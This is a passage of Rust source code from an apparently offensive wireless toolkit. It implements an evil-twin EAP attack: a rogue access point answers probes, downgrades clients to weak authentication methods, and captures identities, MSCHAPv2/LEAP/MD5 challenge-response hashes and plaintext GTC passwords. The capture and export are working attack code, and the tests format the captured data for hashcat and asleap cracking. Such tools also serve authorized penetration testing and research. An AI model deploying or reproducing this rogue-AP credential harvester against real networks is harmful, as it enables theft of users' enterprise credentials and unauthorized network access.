                                }, attack_id);

                                // Trigger EAP
                                thread::sleep(params.eap_start_delay);
                                wait_time += params.eap_start_delay;

                                if client.state == ClientState::Idle || client.state == ClientState::Done {
                                    client.eap_id = 1;
                                    let eap_pkt = eap::build_eap_identity_request(client.eap_id);
                                    let eapol_frame = build_ap_data_frame(
                                        &sta_mac, &our_bssid, &eap_pkt, client.seq_num,
                                    );
                                    client.seq_num = client.seq_num.wrapping_add(1);
                                    let _ = shared.tx_frame(&eapol_frame, &tx_opts);
                                    frames_sent += 1;
                                    client.state = ClientState::IdentitySent;
                                    client.last_activity = Instant::now();

                                    push_event(shared, events, start, EapEventKind::IdentityRequestSent {
                                        mac: sta_mac,
                                    }, attack_id);

                                    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                                    i.eap_started += 1;
                                    i.phase = EapPhase::Active;
                                }
                            }

                            // --- Probe Request (subtype 4) ---
                            4 => {
                                // Respond with probe response if SSID matches (or empty)
                                if frame.raw.len() >= 26 {
                                    let ssid_matches = check_probe_ssid(&frame.raw, ssid);
                                    if ssid_matches {
                                        if let Some(probe_resp) = frames::build_probe_response(
                                            &our_bssid,
                                            &sta_mac,
                                            elapsed.as_micros() as u64,
                                            params.beacon_interval,
                                            cap,
                                            &probe_ies,
                                        ) {
                                            let _ = shared.tx_frame(&probe_resp, &tx_opts);
                                            frames_sent += 1;
                                        }
                                    }
                                }
                            }

                            _ => {} // Ignore other management subtypes
                        }
                    }

                    // === Data frames (EAPOL) ===
                    2 => {
                        // Check if from a client to us
                        let to_ds = fc1 & fc_flags::TO_DS != 0;
                        if !to_ds { continue; }

                        // addr1 = BSSID (us), addr2 = SA (client), addr3 = DA (us)
                        let addr1 = &frame.raw[4..10];
                        if addr1 != our_bssid.as_bytes() { continue; }

                        let sta_mac_bytes: [u8; 6] = frame.raw[10..16].try_into().unwrap_or([0; 6]);
                        let sta_mac = MacAddress::new(sta_mac_bytes);

                        // Parse LLC/SNAP + EAPOL
                        let mut hdr_len: usize = 24;
                        if fc0 & 0x80 != 0 { // QoS subtype
                            hdr_len += 2;
                        }

                        if frame.raw.len() < hdr_len + 12 { continue; }

                        let llc = &frame.raw[hdr_len..];
                        // Check LLC/SNAP matches EAPOL using protocol layer constant
                        if llc.len() < 8 || llc[..8] != eapol_const::LLC_SNAP {
                            continue;
                        }

                        let eapol_data = &llc[8..];
                        if eapol_data.len() < 4 { continue; }

                        let eapol_type = eapol_data[1];

                        // --- EAPOL-Start: client requesting authentication ---
                        if eapol_type == eapol_const::TYPE_START {
                            let client = clients.entry(sta_mac_bytes).or_insert_with(|| {
                                let aid = next_aid;
                                next_aid = next_aid.wrapping_add(1).max(1);
                                EapClient::new(sta_mac, aid)
                            });
                            client.rssi = frame.rssi;
                            client.state = ClientState::Idle;
                            client.last_activity = now;

                            // Send EAP-Request/Identity
                            client.eap_id = 1;
                            let eap_pkt = eap::build_eap_identity_request(client.eap_id);
                            let eapol_frame = build_ap_data_frame(
                                &sta_mac, &our_bssid, &eap_pkt, client.seq_num,
                            );
                            client.seq_num = client.seq_num.wrapping_add(1);
                            let _ = shared.tx_frame(&eapol_frame, &tx_opts);
                            frames_sent += 1;
                            client.state = ClientState::IdentitySent;
                            client.last_activity = Instant::now();

                            push_event(shared, events, start, EapEventKind::IdentityRequestSent {
                                mac: sta_mac,
                            }, attack_id);

                            let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                            i.eap_started += 1;
                            continue;
                        }

                        // --- EAP Packet ---
                        if eapol_type != eapol_const::TYPE_EAP { continue; }

                        let eapol_body_len = u16::from_be_bytes([eapol_data[2], eapol_data[3]]) as usize;
                        let eap_data = &eapol_data[4..];
                        if eap_data.len() < 4 || eap_data.len() < eapol_body_len { continue; }

                        let eap_code = eap_data[0];
                        let eap_id = eap_data[1];
                        let eap_len = u16::from_be_bytes([eap_data[2], eap_data[3]]) as usize;
                        let eap_type_byte = if eap_len >= 5 && eap_data.len() >= 5 { Some(eap_data[4]) } else { None };

                        // Only process EAP-Response (code=2)
                        if eap_code != eap_const::CODE_RESPONSE { continue; }

                        let client = match clients.get_mut(&sta_mac_bytes) {
                            Some(c) => c,
                            None => continue,
                        };
                        client.rssi = frame.rssi;
                        client.last_activity = now;

                        // Determine EAP type
                        let _eap_type_val = eap_type_byte.and_then(EapType::from_u8);

                        // === EAP-Response/Identity ===
                        if eap_type_byte == Some(eap_const::TYPE_IDENTITY) && eap_len > 5 {
                            let id_data = &eap_data[5..eap_len.min(eap_data.len())];
                            if let Some(identity) = eap::parse_eap_identity(id_data) {
                                client.identity = identity.identity.clone();
                                client.domain = identity.realm.clone().unwrap_or_default();

                                push_event(shared, events, start, EapEventKind::IdentityReceived {
                                    mac: sta_mac,
                                    identity: identity.identity.clone(),
                                    domain: identity.realm.clone().unwrap_or_default(),
                                }, attack_id);

                                {
                                    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                                    i.identities_captured += 1;
                                    i.last_identity = identity.identity.clone();
                                    i.last_domain = identity.realm.unwrap_or_default();
                                }

                                // Identity Theft mode: store identity and send failure
                                if params.mode == EapAttackMode::IdentityTheft {
                                    let cred = EapCredential::new(
                                        sta_mac, EapType::Identity,
                                        &client.identity, &client.domain,
                                        client.rssi, start.elapsed(),
                                    );
                                    store_credential(
                                        &cred, &mut credentials, info, events, start, params,
                                    );
                                    push_event(shared, events, start, EapEventKind::IdentityStored {
                                        mac: sta_mac,
                                        identity: client.identity.clone(),
                                    }, attack_id);

                                    // Send EAP-Failure
                                    client.eap_id = client.eap_id.wrapping_add(1);
                                    let fail_pkt = eap::build_eap_failure(eap_id);
                                    let fail_frame = build_ap_data_frame(
                                        &sta_mac, &our_bssid, &fail_pkt, client.seq_num,
                                    );
                                    client.seq_num = client.seq_num.wrapping_add(1);
                                    let _ = shared.tx_frame(&fail_frame, &tx_opts);
                                    frames_sent += 1;
                                    client.state = ClientState::Done;

                                    push_event(shared, events, start, EapEventKind::EapFailureSent {
                                        mac: sta_mac,
                                    }, attack_id);

                                    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                                    i.eap_completed += 1;
                                    i.clients_completed += 1;

                                    // Check max credentials
                                    if should_stop_for_max_creds(params, &credentials) {
                                        push_event(shared, events, start, EapEventKind::MaxCredentialsReached {
                                            count: credentials.len() as u32,
                                        }, attack_id);
                                        running.store(false, Ordering::SeqCst);
                                    }
                                    continue;
                                }

                                // Select method and send challenge
                                let method = params.offered_method
                                    .or_else(|| params.mode.default_method())
                                    .unwrap_or(EapType::MsChapV2);

                                client.offered_method = Some(method);
                                client.eap_id = client.eap_id.wrapping_add(1);

                                send_challenge(
                                    shared, client, &our_bssid, method, params,
                                    &tx_opts, events, start, &mut frames_sent, attack_id,
                                );
                            }
                            continue;
                        }

                        // === EAP-Response/NAK ===
                        if eap_type_byte == Some(eap_const::TYPE_NAK) {
                            let desired_raw = if eap_len > 5 && eap_data.len() > 5 { Some(eap_data[5]) } else { None };
                            let desired = desired_raw.and_then(EapType::from_u8);

                            {
                                let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                                i.eap_naks += 1;
                            }

                            push_event(shared, events, start, EapEventKind::ClientNak {
                                mac: sta_mac,
                                rejected: client.offered_method.unwrap_or(EapType::MsChapV2),
                                desired,
                            }, attack_id);

                            // Evil Twin mode: try client's preferred method
                            if params.mode == EapAttackMode::EvilTwin {
                                if let Some(new_method) = desired {
                                    if new_method.is_bare_capturable() && client.state == ClientState::ChallengeSent {
                                        client.offered_method = Some(new_method);
                                        client.eap_id = client.eap_id.wrapping_add(1);

                                        send_challenge(
                                            shared, client, &our_bssid, new_method, params,
                                            &tx_opts, events, start, &mut frames_sent, attack_id,
                                        );

                                        push_event(shared, events, start, EapEventKind::MethodRetried {
                                            mac: sta_mac,
                                            new_method,
                                        }, attack_id);
                                    }
                                }
                            }
                            continue;
                        }

                        // === EAP-Response/MSCHAPv2 ===
                        if eap_type_byte == Some(eap_const::TYPE_MSCHAPV2)
                            && client.state == ClientState::ChallengeSent
                        {
                            let mschap_data = &eap_data[5..eap_len.min(eap_data.len())];
                            if let Some(resp) = eap::parse_mschapv2_response(mschap_data) {
                                let mut cred = EapCredential::new(
                                    sta_mac, EapType::MsChapV2,
                                    &client.identity, &client.domain,
                                    client.rssi, start.elapsed(),
                                );
                                cred.mschapv2_auth_challenge = client.mschapv2_challenge;
                                cred.mschapv2_peer_challenge = resp.peer_challenge;
                                cred.mschapv2_nt_response = resp.nt_response;
                                cred.has_mschapv2 = true;

                                store_credential(
                                    &cred, &mut credentials, info, events, start, params,
                                );

                                push_event(shared, events, start, EapEventKind::MsChapV2Captured {
                                    mac: sta_mac,
                                    identity: client.identity.clone(),
                                }, attack_id);

                                {
                                    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                                    i.challenges_captured += 1;
                                    i.last_method = Some(EapType::MsChapV2);
                                }

                                // Send EAP-Failure (we can't compute valid success without password)
                                client.eap_id = client.eap_id.wrapping_add(1);
                                let fail_pkt = eap::build_eap_failure(eap_id);
                                let fail_frame = build_ap_data_frame(
                                    &sta_mac, &our_bssid, &fail_pkt, client.seq_num,
                                );
                                client.seq_num = client.seq_num.wrapping_add(1);
                                let _ = shared.tx_frame(&fail_frame, &tx_opts);
                                frames_sent += 1;
                                client.state = ClientState::Done;

                                push_event(shared, events, start, EapEventKind::EapFailureSent { mac: sta_mac }, attack_id);

                                let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                                i.eap_completed += 1;
                                i.clients_completed += 1;

                                if should_stop_for_max_creds(params, &credentials) {
                                    push_event(shared, events, start, EapEventKind::MaxCredentialsReached {
                                        count: credentials.len() as u32,
                                    }, attack_id);
                                    running.store(false, Ordering::SeqCst);
                                }
                            }
                            continue;
                        }

                        // === EAP-Response/LEAP ===
                        if eap_type_byte == Some(eap_const::TYPE_LEAP)
                            && client.state == ClientState::ChallengeSent
                        {
                            let leap_data = &eap_data[5..eap_len.min(eap_data.len())];
                            if let Some(resp) = eap::parse_leap_response(leap_data) {
                                let mut cred = EapCredential::new(
                                    sta_mac, EapType::Leap,
                                    &client.identity, &client.domain,
                                    client.rssi, start.elapsed(),
                                );
                                cred.leap_challenge = client.leap_challenge;
                                if resp.response.len() >= 24 {
                                    cred.leap_response.copy_from_slice(&resp.response[..24]);
                                }
                                cred.has_leap = true;

                                store_credential(
                                    &cred, &mut credentials, info, events, start, params,
                                );

                                push_event(shared, events, start, EapEventKind::LeapCaptured {
                                    mac: sta_mac,
                                    identity: client.identity.clone(),
                                }, attack_id);

                                {
                                    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                                    i.challenges_captured += 1;
                                    i.last_method = Some(EapType::Leap);
                                }

                                finish_client(
                                    shared, client, &sta_mac, &our_bssid, eap_id,
                                    &tx_opts, events, start, &mut frames_sent, info, attack_id,
                                );

                                if should_stop_for_max_creds(params, &credentials) {
                                    push_event(shared, events, start, EapEventKind::MaxCredentialsReached {
                                        count: credentials.len() as u32,
                                    }, attack_id);
                                    running.store(false, Ordering::SeqCst);
                                }
                            }
                            continue;
                        }

                        // === EAP-Response/GTC ===
                        if eap_type_byte == Some(eap_const::TYPE_GTC)
                            && client.state == ClientState::ChallengeSent
                        {
                            let pwd_data = &eap_data[5..eap_len.min(eap_data.len())];
                            if !pwd_data.is_empty() && pwd_data.len() <= 127 {
                                let password = String::from_utf8_lossy(pwd_data).into_owned();

                                let mut cred = EapCredential::new(
                                    sta_mac, EapType::Gtc,
                                    &client.identity, &client.domain,
                                    client.rssi, start.elapsed(),
                                );
                                cred.plaintext_password = password.clone();
                                cred.has_plaintext = true;

                                store_credential(
                                    &cred, &mut credentials, info, events, start, params,
                                );

                                push_event(shared, events, start, EapEventKind::GtcCaptured {
                                    mac: sta_mac,
                                    identity: client.identity.clone(),
                                    password,
                                }, attack_id);

                                {
                                    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                                    i.plaintext_captured += 1;
                                    i.last_method = Some(EapType::Gtc);
                                }

                                finish_client(
                                    shared, client, &sta_mac, &our_bssid, eap_id,
                                    &tx_opts, events, start, &mut frames_sent, info, attack_id,
                                );

                                if should_stop_for_max_creds(params, &credentials) {
                                    push_event(shared, events, start, EapEventKind::MaxCredentialsReached {
                                        count: credentials.len() as u32,
                                    }, attack_id);
                                    running.store(false, Ordering::SeqCst);
                                }
                            }
                            continue;
                        }

                        // === EAP-Response/MD5-Challenge ===
                        if eap_type_byte == Some(eap_const::TYPE_MD5)
                            && client.state == ClientState::ChallengeSent
                        {
                            let md5_data = &eap_data[5..eap_len.min(eap_data.len())];
                            if let Some(resp) = eap::parse_md5_challenge(md5_data) {
                                let mut cred = EapCredential::new(
                                    sta_mac, EapType::Md5Challenge,
                                    &client.identity, &client.domain,
                                    client.rssi, start.elapsed(),
                                );
                                cred.md5_challenge = client.mschapv2_challenge; // reused field
                                if resp.value.len() >= 16 {
                                    cred.md5_response.copy_from_slice(&resp.value[..16]);
                                }
                                cred.md5_id = eap_id;
                                cred.has_md5 = true;

                                store_credential(
                                    &cred, &mut credentials, info, events, start, params,
                                );

                                push_event(shared, events, start, EapEventKind::Md5Captured {
                                    mac: sta_mac,
                                    identity: client.identity.clone(),
                                }, attack_id);

                                {
                                    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
                                    i.challenges_captured += 1;
                                    i.last_method = Some(EapType::Md5Challenge);
                                }

                                finish_client(
                                    shared, client, &sta_mac, &our_bssid, eap_id,
                                    &tx_opts, events, start, &mut frames_sent, info, attack_id,
                                );

                                if should_stop_for_max_creds(params, &credentials) {
                                    push_event(shared, events, start, EapEventKind::MaxCredentialsReached {
                                        count: credentials.len() as u32,
                                    }, attack_id);
                                    running.store(false, Ordering::SeqCst);
                                }
                            }
                            continue;
                        }
                    }

                    _ => {} // Control frames, etc — ignore
                }
            }
            None => {} // No frame — continue loop
        }

        // --- Update info snapshot ---
        {
            let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
            i.elapsed = start.elapsed();
            i.frames_sent = frames_sent;
            i.frames_received = frames_received;
            i.beacons_sent = beacons_sent;
            i.deauths_sent = deauths_sent;
            i.auth_responses_sent = auth_responses_sent;
            i.assoc_responses_sent = assoc_responses_sent;
            i.clients_total = clients.len() as u32;
            i.clients_connected = clients.values()
                .filter(|c| c.state != ClientState::Done)
                .count() as u32;
            i.credentials = credentials.clone();
            i.credentials_total = credentials.len() as u32;

            let active_secs = i.elapsed.saturating_sub(wait_time).as_secs_f64();
            if active_secs > 0.0 {
                i.frames_per_sec = frames_sent as f64 / active_secs;
            }
            i.tx_feedback = tx_fb.snapshot();
        }
    }

    // Final info update
    {
        let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
        i.elapsed = start.elapsed();
        i.frames_sent = frames_sent;
        i.tx_feedback = tx_fb.snapshot();
    }

    // Emit final counters
    emit_counters(shared, attack_id, info, start, &tx_fb);

    // === Cleanup ===
    push_event(shared, events, start, EapEventKind::AttackComplete {
        credentials_total: credentials.len() as u32,
        elapsed: start.elapsed(),
    }, attack_id);

    // Emit AttackComplete with final results
    shared.emit_updates(vec![StoreUpdate::AttackComplete {
        id: attack_id,
        attack_type: AttackType::Eap,
        result: AttackResult::Eap {
            credentials_total: credentials.len() as u32,
            credentials,
        },
    }]);

    shared.unlock_channel();
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Helper functions
// ═══════════════════════════════════════════════════════════════════════════════

/// Build an 802.11 Data frame from AP → STA with LLC/SNAP + EAPOL wrapping.
///
/// Unlike the WPS build_data_frame (client→AP, ToDS), this builds AP→client (FromDS).
/// Address layout for FromDS: addr1=DA(client), addr2=BSSID(us), addr3=SA(us).
fn build_ap_data_frame(sta_mac: &MacAddress, bssid: &MacAddress, eap_packet: &[u8], seq_num: u16) -> Vec<u8> {
    let eapol = eap::wrap_eapol(eap_packet);
    let mut buf = Vec::with_capacity(24 + 8 + eapol.len());

    // 802.11 Data header (FromDS)
    buf.push(fc::DATA);
    buf.push(fc_flags::FROM_DS);
    // Duration
    buf.push(0x00);
    buf.push(0x00);
    // Addr1 = DA (client)
    buf.extend_from_slice(sta_mac.as_bytes());
    // Addr2 = BSSID (us)
    buf.extend_from_slice(bssid.as_bytes());
    // Addr3 = SA (us, same as BSSID for AP-generated frames)
    buf.extend_from_slice(bssid.as_bytes());
    // Seq Control
    let seq = (seq_num << 4) & 0xFFF0;
    buf.push((seq & 0xFF) as u8);
    buf.push((seq >> 8) as u8);

    // LLC/SNAP (8 bytes) for 802.1X — use protocol layer constant
    buf.extend_from_slice(&eapol_const::LLC_SNAP);

    // EAPOL-wrapped EAP packet
    buf.extend_from_slice(&eapol);

    buf
}

/// Send an EAP challenge to a client based on the selected method.
fn send_challenge(
    shared: &SharedAdapter,
    client: &mut EapClient,
    bssid: &MacAddress,
    method: EapType,
    params: &EapParams,
    tx_opts: &TxOptions,
    events: &Arc<EventRing<EapEvent>>,
    start: Instant,
    frames_sent: &mut u64,
    attack_id: AttackId,
) {
    let eap_pkt = match method {
        EapType::MsChapV2 => {
            // Generate or use fixed challenge
            if let Some(fixed) = params.fixed_challenge {
                client.mschapv2_challenge = fixed;
            } else {
                random_bytes(&mut client.mschapv2_challenge);
            }
            eap::build_mschapv2_challenge(client.eap_id, &client.mschapv2_challenge, &params.server_name)
        }
        EapType::Leap => {
            random_bytes(&mut client.leap_challenge);
            eap::build_leap_challenge(client.eap_id, &client.leap_challenge, &params.server_name)
        }
        EapType::Gtc => {
            eap::build_gtc_request(client.eap_id, &params.gtc_prompt)
        }
        EapType::Md5Challenge => {
            let mut challenge = [0u8; 16];
            random_bytes(&mut challenge);
            client.mschapv2_challenge = challenge; // reuse field for MD5
            eap::build_md5_challenge(client.eap_id, &challenge, &params.server_name)
        }
        _ => return, // Unsupported method
    };

    let frame = build_ap_data_frame(&client.mac, bssid, &eap_pkt, client.seq_num);
    client.seq_num = client.seq_num.wrapping_add(1);
    let _ = shared.tx_frame(&frame, tx_opts);
    *frames_sent += 1;
    client.state = ClientState::ChallengeSent;
    client.last_activity = Instant::now();

    push_event(shared, events, start, EapEventKind::ChallengeSent {
        mac: client.mac,
        method,
    }, attack_id);
}

/// Send EAP-Failure and mark client as done.
fn finish_client(
    shared: &SharedAdapter,
    client: &mut EapClient,
    sta_mac: &MacAddress,
    bssid: &MacAddress,
    eap_id: u8,
    tx_opts: &TxOptions,
    events: &Arc<EventRing<EapEvent>>,
    start: Instant,
    frames_sent: &mut u64,
    info: &Arc<Mutex<EapInfo>>,
    attack_id: AttackId,
) {
    client.eap_id = client.eap_id.wrapping_add(1);
    let fail_pkt = eap::build_eap_failure(eap_id);
    let fail_frame = build_ap_data_frame(sta_mac, bssid, &fail_pkt, client.seq_num);
    client.seq_num = client.seq_num.wrapping_add(1);
    let _ = shared.tx_frame(&fail_frame, tx_opts);
    *frames_sent += 1;
    client.state = ClientState::Done;

    push_event(shared, events, start, EapEventKind::EapFailureSent { mac: *sta_mac }, attack_id);

    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
    i.eap_completed += 1;
    i.clients_completed += 1;
}

/// Store a credential and update info.
fn store_credential(
    cred: &EapCredential,
    credentials: &mut Vec<EapCredential>,
    info: &Arc<Mutex<EapInfo>>,
    events: &Arc<EventRing<EapEvent>>,
    start: Instant,
    _params: &EapParams,
) {
    credentials.push(cred.clone());

    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
    i.credentials_total = credentials.len() as u32;
    i.last_identity = cred.identity.clone();
    i.last_domain = cred.domain.clone();
    i.last_method = Some(cred.method);
    let _ = (events, start); // used by caller for event push
}

/// Check if we should stop due to max credentials limit.
fn should_stop_for_max_creds(params: &EapParams, credentials: &[EapCredential]) -> bool {
    params.max_credentials > 0 && credentials.len() as u32 >= params.max_credentials
}

/// Check if a probe request's SSID matches ours (or is broadcast/empty).
fn check_probe_ssid(frame_data: &[u8], our_ssid: &str) -> bool {
    // IEs start at offset 24 for probe request (no fixed fields)
    if frame_data.len() < 26 { return false; }

    let ies = &frame_data[24..];
    // First IE should be SSID (tag 0)
    if ies.len() < 2 || ies[0] != 0 { return false; }
    let ssid_len = ies[1] as usize;

    // Empty/broadcast SSID = respond to all
    if ssid_len == 0 { return true; }

    if ies.len() < 2 + ssid_len { return false; }
    let ssid_bytes = &ies[2..2 + ssid_len];

    ssid_bytes == our_ssid.as_bytes()
}

/// Push an event with auto-incrementing seq and timestamp.
fn push_event(
    shared: &SharedAdapter,
    events: &Arc<EventRing<EapEvent>>,
    start: Instant,
    kind: EapEventKind,
    attack_id: AttackId,
) {
    let seq = events.seq() + 1;
    let timestamp = start.elapsed();

    // Emit into the delta stream
    shared.emit_updates(vec![StoreUpdate::AttackEvent {
        id: attack_id,
        seq,
        timestamp,
        event: AttackEventKind::Eap(kind.clone()),
    }]);

    // Push to legacy EventRing (still consumed by CLI polling path)
    events.push(EapEvent { seq, timestamp, kind });
}

/// Update attack phase.
fn set_phase(
    shared: &SharedAdapter,
    info: &Arc<Mutex<EapInfo>>,
    phase: EapPhase,
    attack_id: AttackId,
) {
    // Emit phase change into the delta stream
    shared.emit_updates(vec![StoreUpdate::AttackPhaseChanged {
        id: attack_id,
        phase: phase.to_attack_phase(),
    }]);

    // Update legacy Info struct (still consumed by CLI polling path)
    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
    i.phase = phase;
    i.elapsed = i.start_time.elapsed();
}

/// Emit counter snapshot into the delta stream.
fn emit_counters(
    shared: &SharedAdapter,
    attack_id: AttackId,
    info: &Arc<Mutex<EapInfo>>,
    start: Instant,
    tx_fb: &Arc<crate::core::TxFeedback>,
) {
    let info = info.lock().unwrap_or_else(|e| e.into_inner());
    shared.emit_updates(vec![StoreUpdate::AttackCountersUpdate {
        id: attack_id,
        frames_sent: info.frames_sent,
        frames_received: info.frames_received,
        frames_per_sec: info.frames_per_sec,
        elapsed: start.elapsed(),
        tx_feedback: tx_fb.snapshot(),
    }]);
}

/// Generate random bytes using a simple PRNG (cryptographic quality not required
/// for challenges — just unpredictability sufficient for EAP exchanges).
fn random_bytes(buf: &mut [u8]) {
    use std::time::SystemTime;
    let seed = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    let mut state = seed as u64;
    // Mix in pointer to stack variable for uniqueness across parallel calls
    state = state.wrapping_mul(6364136223846793005).wrapping_add(
        (&state as *const u64) as u64
    );
    for byte in buf.iter_mut() {
        state = state.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
        *byte = (state >> 33) as u8;
    }
}

/// Encode bytes as lowercase hex string.
#[allow(dead_code)]
fn hex_encode(bytes: &[u8]) -> String {
    let mut s = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        s.push_str(&format!("{:02x}", b));
    }
    s
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Tests
// ═══════════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    // ── Params defaults ──

    #[test]
    fn test_params_default_mode() {
        let p = EapParams::default();
        assert_eq!(p.mode, EapAttackMode::EvilTwin);
        assert_eq!(p.beacon_interval, 100);
        assert_eq!(p.deauth_original, true);
        assert_eq!(p.deauth_count, 5);
        assert_eq!(p.max_credentials, 0);
        assert_eq!(p.max_clients, 64);
        assert_eq!(p.rssi_min_dbm, -90);
        assert_eq!(p.server_name, "Enterprise");
        assert_eq!(p.gtc_prompt, "Password: ");
        assert_eq!(p.eap_timeout, Duration::from_secs(10));
        assert_eq!(p.timeout, Duration::ZERO);
    }

    #[test]
    fn test_params_default_production_ready() {
        let p = EapParams::default();
        assert!(p.beacon_interval > 0);
        assert_eq!(p.mode, EapAttackMode::EvilTwin);
    }

    // ── Attack modes ──

    #[test]
    fn test_mode_default_methods() {
        assert_eq!(EapAttackMode::EvilTwin.default_method(), Some(EapType::MsChapV2));
        assert_eq!(EapAttackMode::CredentialHarvest.default_method(), Some(EapType::MsChapV2));
        assert_eq!(EapAttackMode::EapDowngrade.default_method(), Some(EapType::Gtc));
        assert_eq!(EapAttackMode::IdentityTheft.default_method(), None);
        assert_eq!(EapAttackMode::CertBypass.default_method(), Some(EapType::MsChapV2));
    }

    #[test]
    fn test_mode_names() {
        assert_eq!(EapAttackMode::EvilTwin.name(), "Evil Twin");
        assert_eq!(EapAttackMode::EvilTwin.short_name(), "evil-twin");
        assert_eq!(EapAttackMode::EapDowngrade.short_name(), "downgrade");
        assert_eq!(EapAttackMode::IdentityTheft.short_name(), "identity");
    }

    // ── AP data frame builder ──

    #[test]
    fn test_build_ap_data_frame_from_ds() {
        let sta = MacAddress::new([0x11, 0x22, 0x33, 0x44, 0x55, 0x66]);
        let bssid = MacAddress::new([0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]);
        let eap_pkt = eap::build_eap_identity_request(1);
        let frame = build_ap_data_frame(&sta, &bssid, &eap_pkt, 0);

        // FC: Data (0x08), FromDS (0x02)
        assert_eq!(frame[0], fc::DATA);
        assert_eq!(frame[1], fc_flags::FROM_DS);
        // Addr1 = DA (client)
        assert_eq!(&frame[4..10], sta.as_bytes());
        // Addr2 = BSSID (us)
        assert_eq!(&frame[10..16], bssid.as_bytes());
        // Addr3 = SA (us, same as BSSID)
        assert_eq!(&frame[16..22], bssid.as_bytes());
        // LLC/SNAP for 802.1X
        assert_eq!(&frame[24..32], &[0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E]);
        // EAPOL header: version=2, type=EAP(0)
        assert_eq!(frame[32], 0x02); // Version
        assert_eq!(frame[33], 0x00); // Type: EAP
        // EAP packet follows
        let eap_start = 32 + 4; // after EAPOL header
        assert_eq!(frame[eap_start], eap_const::CODE_REQUEST); // Code: Request
        assert_eq!(frame[eap_start + 1], 1); // ID: 1
        assert_eq!(frame[eap_start + 4], eap_const::TYPE_IDENTITY); // Type: Identity
    }

    #[test]
    fn test_build_ap_data_frame_seq_num() {
        let sta = MacAddress::new([0x11, 0x22, 0x33, 0x44, 0x55, 0x66]);
        let bssid = MacAddress::new([0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]);
        let eap_pkt = eap::build_eap_failure(1);

        let frame0 = build_ap_data_frame(&sta, &bssid, &eap_pkt, 0);
        let frame1 = build_ap_data_frame(&sta, &bssid, &eap_pkt, 1);
        let frame42 = build_ap_data_frame(&sta, &bssid, &eap_pkt, 42);

        // Seq control at bytes 22-23
        assert_eq!(u16::from_le_bytes([frame0[22], frame0[23]]) >> 4, 0);
        assert_eq!(u16::from_le_bytes([frame1[22], frame1[23]]) >> 4, 1);
        assert_eq!(u16::from_le_bytes([frame42[22], frame42[23]]) >> 4, 42);
    }

    // ── Credential export ──

    #[test]
    fn test_credential_export_mschapv2() {
        let mut cred = EapCredential::new(
            MacAddress::new([0x11, 0x22, 0x33, 0x44, 0x55, 0x66]),
            EapType::MsChapV2,
            "user@corp.com", "corp.com",
            -45, Duration::from_secs(3),
        );
        cred.mschapv2_auth_challenge = [0x01; 16];
        cred.mschapv2_peer_challenge = [0x02; 16];
        cred.mschapv2_nt_response = [0x03; 24];
        cred.has_mschapv2 = true;

        let line = cred.export_hash_line();
        assert!(line.starts_with("user@corp.com::::"));
        assert!(line.contains("030303")); // nt_response
        assert_eq!(cred.hashcat_mode(), Some(5500));
        assert_eq!(cred.cracking_tool(), "hashcat -m 5500");
    }

    #[test]
    fn test_credential_export_leap() {
        let mut cred = EapCredential::new(
            MacAddress::new([0x11, 0x22, 0x33, 0x44, 0x55, 0x66]),
            EapType::Leap,
            "admin", "",
            -50, Duration::from_secs(1),
        );
        cred.leap_challenge = [0xAA; 8];
        cred.leap_response = [0xBB; 24];
        cred.has_leap = true;

        let line = cred.export_hash_line();
        // asleap format: challenge:response:username
        assert!(line.starts_with("aaaa"));
        assert!(line.ends_with("admin"));
        assert_eq!(cred.cracking_tool(), "asleap");
    }

    #[test]
    fn test_credential_export_gtc() {
        let mut cred = EapCredential::new(
            MacAddress::new([0x11, 0x22, 0x33, 0x44, 0x55, 0x66]),
            EapType::Gtc,
            "bob@domain.com", "domain.com",
            -60, Duration::from_secs(2),
        );
        cred.plaintext_password = "P@ssw0rd!".to_string();
        cred.has_plaintext = true;

        let line = cred.export_hash_line();
        assert!(line.contains("bob@domain.com"));
        assert!(line.contains("P@ssw0rd!"));
        assert_eq!(cred.hashcat_mode(), None);
        assert_eq!(cred.cracking_tool(), "none (plaintext)");
    }

    #[test]
    fn test_credential_export_md5() {
        let mut cred = EapCredential::new(
            MacAddress::new([0x11, 0x22, 0x33, 0x44, 0x55, 0x66]),
            EapType::Md5Challenge,
            "testuser", "",
            -55, Duration::from_secs(4),
        );
        cred.md5_challenge = [0xCC; 16];
        cred.md5_response = [0xDD; 16];
        cred.md5_id = 0x42;
        cred.has_md5 = true;

        let line = cred.export_hash_line();
        // hashcat -m 4800: response:challenge:id
        assert!(line.contains("dddd"));
        assert!(line.contains("cccc"));
        assert!(line.ends_with("42"));
        assert_eq!(cred.hashcat_mode(), Some(4800));
    }

    #[test]
    fn test_credential_export_identity_only() {
        let cred = EapCredential::new(
            MacAddress::new([0x11, 0x22, 0x33, 0x44, 0x55, 0x66]),
            EapType::Identity,
            "stealth@target.org", "target.org",
            -40, Duration::from_secs(1),
        );

        let line = cred.export_hash_line();
        assert!(line.contains("stealth@target.org"));
        assert!(line.contains("no credentials"));
    }

    // ── Probe SSID matching ──

    #[test]
    fn test_check_probe_ssid_match() {
        // Build a minimal probe request frame with SSID IE
        let mut frame = vec![0u8; 24]; // management header
        frame.push(0x00); // SSID tag
        frame.push(0x07); // length
        frame.extend_from_slice(b"CorpNet");

        assert!(check_probe_ssid(&frame, "CorpNet"));
